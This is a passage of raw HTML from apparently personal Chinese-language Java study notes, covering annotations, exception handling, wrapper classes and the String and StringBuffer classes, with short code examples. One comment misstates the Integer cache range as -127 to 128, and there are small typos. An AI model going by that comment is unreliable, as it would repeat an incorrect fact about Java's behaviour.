class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Father</span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fly</span><span class="params">()</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Father fly&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这个@Override其实是可写可不写，但是写了会让系统再编译的时候去检查这里是否真的重写了，重写了才能编译成功，没重写就会报错</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Son</span> <span class="keyword">extends</span> <span class="title class_">Father</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">fly</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Son fly&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Override &#123;</span><br><span class="line">    <span class="comment">//这是一个注解类，不是接口</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="deprecated"><a class="markdownIt-Anchor" href="#deprecated">#</a> @Deprecated</h2><ol><li>用于表示某个程序元素（类、方法、属性等）已过时</li><li>可以修饰方法、类、字段、包、参数等</li><li>@Deprecated 的作用可以做到新旧版本的兼容和过渡</li><li>@Target(value={CONSTRUCTOR, FIELD, LOCAL_VARIABLE, METHOD, PACKAGE, PARAMETER, TYPE})</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Grass2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">A</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">A</span>();</span><br><span class="line">        a.hi();</span><br><span class="line">        System.out.println(a.n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;</span><br><span class="line">    <span class="meta">@Deprecated</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="meta">@Deprecated</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hi</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;hi&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="suppresswarnings"><a class="markdownIt-Anchor" href="#suppresswarnings">#</a> @SuppressWarnings</h2><p>有时候写代码，代码其实可以正常运行，但是会有一些警告，这个时候就可以用 @SuppressWarnings 注解来抑制警告信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@SuppressWarnings(&#123;&quot;all&quot;, &quot;rawtypes&quot;&#125;)</span></span><br><span class="line"><span class="comment">//除了all还有专门抑制其他某种类型警告，具体的使用可以查阅资料</span></span><br></pre></td></tr></table></figure><ul><li>@SuppressWarnings 的作用范围和放置的位置相关，比如放在 main 方法，那么抑制的范围就是 main 方法</li></ul><h1 id="异常exception"><a class="markdownIt-Anchor" href="#异常exception">#</a> 异常 Exception</h1><p>快捷键：ctrl + alt + t 选择 try-catch</p><h2 id="异常的概念"><a class="markdownIt-Anchor" href="#异常的概念">#</a> 异常的概念</h2><p>一般可以分为两类</p><ol><li>Error：java 虚拟机无法解决的严重问题，如：JVM 系统内部错误、资源耗尽等严重情况。比如 StackOverflow [栈溢出] 和 OOM (out of memory)，Error 是严重错误，程序会崩溃</li><li>Exception：其它因编程错误或偶然的外在因素导致的一般性问题，可以使用针对性的代码进行处理。例如空指针方向，试图读取不存在的文件，网络连接中断等等，Exception 分为两大类：运行时异常和编译时异常</li></ol><h2 id="异常体系图"><a class="markdownIt-Anchor" href="#异常体系图">#</a> 异常体系图</h2><p><img src="/2024/12/06/java%E7%AC%94%E8%AE%B0/C:%5CUsers%5CAhan%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20240908205218302.png" alt="image-20240908205218302"></p><ol><li>异常分为两大类，运行时异常和编译时异常</li><li>运行时异常编译器检查不出来，一般是指编程时的逻辑错误，时程序员应该避免其出现的异常。java.lang.RuntimeException 类以及它的子类都是运行时异常</li><li>对于运行时异常，可以不做处理，因为这类异常很普遍，若全处理看你会对程序的可读性和运行效率产生影响</li><li>编译时异常时编译器要求必须处理的异常</li></ol><ul><li>常见的运行时异常：<ol><li>NullPointException 空指针异常：当应用程序试图在需要对象的地方使用 null 时，抛出该异常</li><li>ArithmeticException 数学运算异常</li><li>ArrayIndexOutOfBoundsException 数组下标越界异常</li><li>ClassCastException 类型转换异常</li><li>NumberFormatException 数字格式不正确异常</li></ol></li><li>常见的编译异常：<ol><li>SQLException：操作数据库时，查询表可能发生异常</li><li>IOException：操作文件时发生的异常</li><li>FileNotFoundException：当操作一个不存在的文件时发生异常</li><li>ClassNotFoundException：加载类，而该类不存在时异常</li><li>EOFException：操作文件，到文件末尾，发生异常</li><li>IllegalArgumentException：参数异常</li></ol></li></ul><h2 id="异常处理概念"><a class="markdownIt-Anchor" href="#异常处理概念">#</a> 异常处理概念</h2><p>异常处理就是当异常发生时，对异常处理的方式</p><h3 id="try-catch-finally"><a class="markdownIt-Anchor" href="#try-catch-finally">#</a> try-catch-finally</h3><p>程序员在代码中捕获发生的异常，自行处理</p><p>try 块用于包含可能出错的代码，catch 块用于处理 try 块中发生的异常，可以根据需要在程序中有多个 try-catch 模块</p><p><strong>注意事项：</strong></p><ol><li>如果异常发生了，则异常发生后面的代码都不会执行，直接进入到 catch 块</li><li>如果异常没有发生，则顺序执行 try 的代码块，不会进入 catch</li><li>如果希望不管是否发生异常，都执行某段代码（比如关闭连接，释放资源等），则使用 finally {}</li><li>如果 try 代码块可能有多个异常，，可以使用多个 catch 分别捕获不同的异常，但是要求子类异常写在前面，父类一场写在后面（比如 Exception 在后，NullPointerException 在前），如果发生异常，只会匹配一个 catch</li><li>可以进场 try-finally 配合使用，这种用法相当于没有捕获异常，因此程序会直接崩掉。当希望执行一段代码，不管是否发生异常，都必须执行某个业务逻辑时可以使用</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">//可疑代码</span></span><br><span class="line">    <span class="comment">//将异常生成对应的异常对象，传送给catch块</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(异常) &#123;</span><br><span class="line">    <span class="comment">//对异常的处理</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(异常) &#123;</span><br><span class="line">    <span class="comment">//对异常的处理</span></span><br><span class="line">&#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">    <span class="comment">//释放资源等</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="throws"><a class="markdownIt-Anchor" href="#throws">#</a> throws</h3><p>将发生的异常抛出，交给调用者（方法）来处理，最顶级的处理者就是 JVM</p><p>如果一个方法（中的语句执行时）可能生成某种异常，但不能确定如何处理这种异常，则此方法显式地声明抛出异常，表明该方法将不对这些异常进行处理，而又该方法的调用者处理</p><p>在方法声明中用 throws 语句可以声明抛出异常的列表，throws 后面的异常类型可以是方法中产生的异常类型，也可以是它的父类</p><p><strong>注意事项：</strong></p><ol><li>对于编译异常，程序中必须处理，比如 try-catch 或者 throws</li><li>对于运行时异常，程序中如果没有处理，默认就是 throws 的方式处理</li><li>子类重写父类的方法时，对抛出异常的规定：子类重写的方法所抛出的异常类型要么和父类抛出的<strong>一致</strong>，要么为父类抛出的异常的类型的<strong>子类型</strong></li><li>在 throws 过程中，如果有方法 try-catch，就相当于处理异常，就可以不必 throws</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">f1</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;<span class="comment">//这里是Exception是父类，也可以是FileNotFoundException子类</span></span><br><span class="line">       <span class="comment">//也可以多个子类异常，逗号分隔</span></span><br><span class="line">    <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;d://1.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="自定义异常"><a class="markdownIt-Anchor" href="#自定义异常">#</a> 自定义异常</h2><p>当程序中出现了某些错误，但该错误信息并没有在 Throwable 子类中描述处理，这个时候可以自己设计异常类，用于描述该错误信息</p><p>自定义异常的步骤</p><ol><li>定义类：自定义异常类名（程序员自己写），继承 Exception 或 RuntimeException</li><li>如果继承 Exception，属于编译异常</li><li>如果继承 RuntimeException，属于运行异常（一般来说继承 RuntimeException）</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Grass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> <span class="number">151</span>;</span><br><span class="line">        <span class="keyword">if</span>(!(age &gt;= <span class="number">18</span> &amp;&amp; age &lt;= <span class="number">120</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AgeException</span>(<span class="string">&quot;age should between 18 and 120.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//一般情况我们自定义异常时，最好是继承RuntimeException</span></span><br><span class="line"><span class="comment">//这样比较方便，不需要在主方法中再去抛异常</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AgeException</span> <span class="keyword">extends</span> <span class="title class_">RuntimeException</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">AgeException</span><span class="params">(String message)</span> &#123;<span class="comment">//构造器</span></span><br><span class="line">        <span class="built_in">super</span>(message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="throw和throws的对比"><a class="markdownIt-Anchor" href="#throw和throws的对比">#</a> throw 和 throws 的对比</h2><table><thead><tr><th></th><th>意义</th><th>位置</th><th>后面跟的东西</th></tr></thead><tbody><tr><td>throws</td><td>异常处理的一种方式</td><td>方法声明处</td><td>异常类型</td></tr><tr><td>throw</td><td>手动生成异常对象的关键字</td><td>方法体中</td><td>异常对象</td></tr></tbody></table><h1 id="常用类"><a class="markdownIt-Anchor" href="#常用类">#</a> 常用类</h1><h2 id="包装类wrapper"><a class="markdownIt-Anchor" href="#包装类wrapper">#</a> 包装类 Wrapper</h2><h4 id="包装类的分类"><a class="markdownIt-Anchor" href="#包装类的分类">#</a> 包装类的分类</h4><ol><li>针对八种基本数据类型相应的应用类型 —— 包装类</li><li>有了类的特点，就可以调用类中的方法</li></ol><table><thead><tr><th>基本数据类型</th><th>包装类</th></tr></thead><tbody><tr><td>boolean</td><td>Boolean</td></tr><tr><td>char</td><td>Character</td></tr><tr><td>byte</td><td>Byte</td></tr><tr><td>short</td><td>Short</td></tr><tr><td>int</td><td>Integer</td></tr><tr><td>long</td><td>Long</td></tr><tr><td>float</td><td>Float</td></tr><tr><td>double</td><td>Double</td></tr></tbody></table><h4 id="包装类和基本数据类型的转换"><a class="markdownIt-Anchor" href="#包装类和基本数据类型的转换">#</a> 包装类和基本数据类型的转换</h4><p>包装类是对象，基本数据类型是属性</p><ol><li>jdk5 前的手动装箱和拆箱方式，装箱：基本类型 -&gt; 包装类型，反过来就是拆箱</li><li>jdk5 及以后的自动装箱和拆箱方式</li><li>自动装箱底层调用的时 valueOf 方法，比如 Integer.valueOf ()</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Grass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//手动装箱int-&gt;Integer</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">n1</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">integer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(n1);</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">integer1</span> <span class="operator">=</span> Integer.valueOf(n1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//手动拆箱Integer-&gt;int</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> integer.intValue();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//jdk5后，就可以自动装箱和自动拆箱</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">n2</span> <span class="operator">=</span> <span class="number">200</span>;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">interger2</span> <span class="operator">=</span> n2;<span class="comment">//底层使用的依然还是Integer.valueOf(n2)</span></span><br><span class="line">        <span class="comment">//自动拆箱</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">n3</span> <span class="operator">=</span> interger2;<span class="comment">//底层使用的还是intValue()方法</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="包装类型和string类型的相互转换"><a class="markdownIt-Anchor" href="#包装类型和string类型的相互转换">#</a> 包装类型和 String 类型的相互转换</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Grass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//包装类(Integer)-&gt;String</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">        <span class="comment">//way 1</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> i + <span class="string">&quot;&quot;</span>;<span class="comment">//这里只是以i为主体进行了一个转换，但i自己本身还是没变化</span></span><br><span class="line">        <span class="comment">//way2</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> i.toString();</span><br><span class="line">        <span class="comment">//way3</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str3</span> <span class="operator">=</span> String.valueOf(i);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//String-&gt;包装类(Integer)</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str4</span> <span class="operator">=</span> <span class="string">&quot;12345&quot;</span>;</span><br><span class="line">        <span class="comment">//way1</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> Integer.parseInt(str4);<span class="comment">//使用到了自动装箱</span></span><br><span class="line">        <span class="comment">//way2</span></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(str4);<span class="comment">//用到了构造器，可以ctrl+b查看</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="integer类和character类的常用方法"><a class="markdownIt-Anchor" href="#integer类和character类的常用方法">#</a> Integer 类和 Character 类的常用方法</h2><p>这几个是比较常用的，还有非常多</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(Integer.MIN_VALUE);<span class="comment">//返回最大/最小值</span></span><br><span class="line">   System.out.println(Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">   System.out.println(Character.isDigit(<span class="string">&#x27;a&#x27;</span>));<span class="comment">//判断是不是数字</span></span><br><span class="line">System.out.println(Character.isLetter(<span class="string">&#x27;a&#x27;</span>));<span class="comment">//判断是不是字母</span></span><br><span class="line">   System.out.println(Character.isLowerCase(<span class="string">&#x27;a&#x27;</span>));<span class="comment">//判断大小写</span></span><br><span class="line">   System.out.println(Character.isUpperCase(<span class="string">&#x27;a&#x27;</span>));</span><br><span class="line"></span><br><span class="line">   System.out.println(Character.isWhitespace(<span class="string">&#x27;a&#x27;</span>));<span class="comment">//判断是不是空格</span></span><br><span class="line">   System.out.println(Character.toUpperCase(<span class="string">&#x27;a&#x27;</span>));<span class="comment">//转换大小写</span></span><br><span class="line">   System.out.println(Character.toLowerCase(<span class="string">&#x27;A&#x27;</span>));</span><br></pre></td></tr></table></figure><h2 id="integer类"><a class="markdownIt-Anchor" href="#integer类">#</a> Integer 类</h2><p><strong>面试题：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//由于生成的是两个对象，所以结果为false</span></span><br><span class="line">    <span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">j</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">1</span>);</span><br><span class="line">    System.out.println(i == j);</span><br><span class="line">        </span><br><span class="line">    <span class="type">Integer</span> <span class="variable">m</span> <span class="operator">=</span> <span class="number">1</span>;<span class="comment">//底层为Integer.valueOf(1);</span></span><br><span class="line">    <span class="type">Integer</span> <span class="variable">n</span> <span class="operator">=</span> <span class="number">1</span>;<span class="comment">//底层为Integer.valueOf(1);</span></span><br><span class="line">    System.out.println(m == n);<span class="comment">//在valueOf源码中，赋值在-127~128之间的，</span></span><br><span class="line">    <span class="comment">//就直接返回数值，而超过这个范围的，就new一个对象返回，所以这里为true</span></span><br><span class="line">        </span><br><span class="line">    <span class="type">Integer</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">128</span>;</span><br><span class="line">    <span class="type">Integer</span> <span class="variable">y</span> <span class="operator">=</span> <span class="number">128</span>;</span><br><span class="line">    System.out.println(x == y);</span><br><span class="line">    <span class="comment">//而这里大于了127不在范围中，返回一个对象，所以x和y是不同的两个对象，为false</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">128</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> <span class="number">128</span>;</span><br><span class="line">System.out.println(x == y);</span><br><span class="line"><span class="comment">//这个要注意，只要有int类型的(基本数据类型)，那么做比较的时候就是比较值是否相等</span></span><br><span class="line"><span class="comment">//哪怕x的底层是new一个对象，但这里对比的还是值的大小</span></span><br><span class="line"><span class="comment">//所以这里输出为true</span></span><br></pre></td></tr></table></figure><h2 id="string类"><a class="markdownIt-Anchor" href="#string类">#</a> String 类</h2><ol><li><p>字符串的字符使用 Unicode 字符编码，一个字符（不区分字母还是汉字）占两个字节</p></li><li><p>String 类较常用构造器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">String s1 = new String();</span><br><span class="line">String s2 = new String(String original);</span><br><span class="line">String s3 = new String(char[] a);</span><br><span class="line">String s4 = new String(char[] a, int startIndex, int count);</span><br></pre></td></tr></table></figure></li><li><p>String 类实现了接口 Serializable（String 可以序列化，在网络传输），还实现了 Comparable（对象可以比较大小）</p></li><li><p>String 是 final 类，不能被其他的类继承</p></li><li><p>String 有属性 private final char value []; 用于存放字符串内容，所以其本质是字符数组</p></li><li><p>value 是一个 final 类型，不可以修改（地址不可修改，值可以修改）</p></li></ol><h3 id="创建string对象的两种方式"><a class="markdownIt-Anchor" href="#创建string对象的两种方式">#</a> 创建 String 对象的两种方式</h3><ol><li><p>直接赋值： <code>String s = &quot;tch&quot;;</code></p><p>创建过程：先从常量池查看是否有 &quot;tch&quot; 数据空间，如果有，则直接指向它；如果没有则重写创建，然后指向。s 最终指向的是常量池的空间地址</p></li><li><p>调用构造器： <code>String s = new String(&quot;tch&quot;);</code></p><p>创建过程：先在堆中创建空间，里面维护了 value 属性，指向常量池的 &quot;tch&quot; 空间。如果常量池没有 &quot;tch&quot;，就重新创建，如果有，就直接通过 value 指向。最终指向的是堆中的空间地址</p><h3 id="实例-4"><a class="markdownIt-Anchor" href="#实例-4">#</a> 实例</h3></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> <span class="string">&quot;tch&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">b</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;tch&quot;</span>);</span><br><span class="line"></span><br><span class="line">System.out.println(a.equals(b));<span class="comment">//T</span></span><br><span class="line">System.out.println(a == b);<span class="comment">//F</span></span><br><span class="line">System.out.println(a == b.intern());<span class="comment">//T</span></span><br><span class="line">System.out.println(b == b.intern());<span class="comment">//F</span></span><br><span class="line"><span class="comment">//intern()方法的作用：如果池中已经包含了一个等于这个String对象的字符串，就直接返回池中的字符串。否则，将此String对象添加到池中，并返回此String对象的引用</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Person</span> <span class="variable">p1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">p1.name = <span class="string">&quot;tch&quot;</span>;</span><br><span class="line"><span class="type">Person</span> <span class="variable">p2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">p2.name = <span class="string">&quot;tch&quot;</span>;</span><br><span class="line"></span><br><span class="line">System.out.println(p1.name.equals(p2.name));<span class="comment">//T</span></span><br><span class="line">System.out.println(p1.name == p2.name);<span class="comment">//T</span></span><br><span class="line">System.out.println(p1.name == <span class="string">&quot;tch&quot;</span>);<span class="comment">//T</span></span><br><span class="line">        </span><br><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;tch&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;tch&quot;</span>);</span><br><span class="line">System.out.println(s1 == s2);<span class="comment">//F</span></span><br></pre></td></tr></table></figure><h3 id="string对象特性"><a class="markdownIt-Anchor" href="#string对象特性">#</a> String 对象特性</h3><ol><li>String 是一个 final 类，代表不可变的字符序列</li><li>字符串是不可变的，一个字符串对象一旦被分配，其内容是不可改变的</li><li>常量相加，看的是常量池；变量相加，看的是堆</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//一共有三个对象</span></span><br><span class="line"><span class="type">String</span> <span class="variable">a</span> <span class="operator">=</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">b</span> <span class="operator">=</span> <span class="string">&quot;abc&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">c</span> <span class="operator">=</span> a + b;</span><br><span class="line"><span class="comment">//1.先创建一个StringBuilder sb = StringBuilder()</span></span><br><span class="line"><span class="comment">//2.执行sb.append(&quot;hello&quot;);</span></span><br><span class="line"><span class="comment">//3.执行sb.append(&quot;abc&quot;);</span></span><br><span class="line"><span class="comment">//4.String c = sb.toString();</span></span><br><span class="line"><span class="comment">//最后c指向堆中的对象(String)value[]--&gt;池中的&quot;helloabc&quot;</span></span><br></pre></td></tr></table></figure><h3 id="string类的常见方法"><a class="markdownIt-Anchor" href="#string类的常见方法">#</a> String 类的常见方法</h3><p>String 类是保存字符串常量的，每次更新都需要重新开辟空间，效率较低，因此 java 设计者还提供了 StringBuilder 和 StringBuffer 来增强 String 的功能。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">substring(<span class="number">1</span>,<span class="number">4</span>);<span class="comment">//左闭右开，截取从1到4减1的字符串</span></span><br><span class="line">indexOf();<span class="comment">//获取字符在字符串对象中第一次出现的索引，从0开始，若找不到返回-1</span></span><br><span class="line">toUpperCase();toLowerCase();concat();replace();</span><br><span class="line">split();compareTo(); toCharArray();format();</span><br></pre></td></tr></table></figure><h2 id="stringbuffer类"><a class="markdownIt-Anchor" href="#stringbuffer类">#</a> StringBuffer 类</h2><ol><li>java.lang.StringBuffer 代表可变的字符序列，可以对字符串内容进行增删</li><li>很多方法与 StringBuffer 相同，但 StringBuffer 是可变长度的</li><li>StringBuffer 是一个容器</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">StringBuffer</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="string">&quot;hello&quot;</span>);</span><br><span class="line"><span class="comment">//1.StringBuffer的直接父类是AbstractStringBuilder</span></span><br><span class="line"><span class="comment">//2.StringBuffer实现了序列化</span></span><br><span class="line"><span class="comment">//3.在父类中AbstractStringBuilder有属性char[] value，且不是final</span></span><br><span class="line"><span class="comment">//4.该value数组存放字符串内容，因此他是存放在堆中的</span></span><br><span class="line"><span 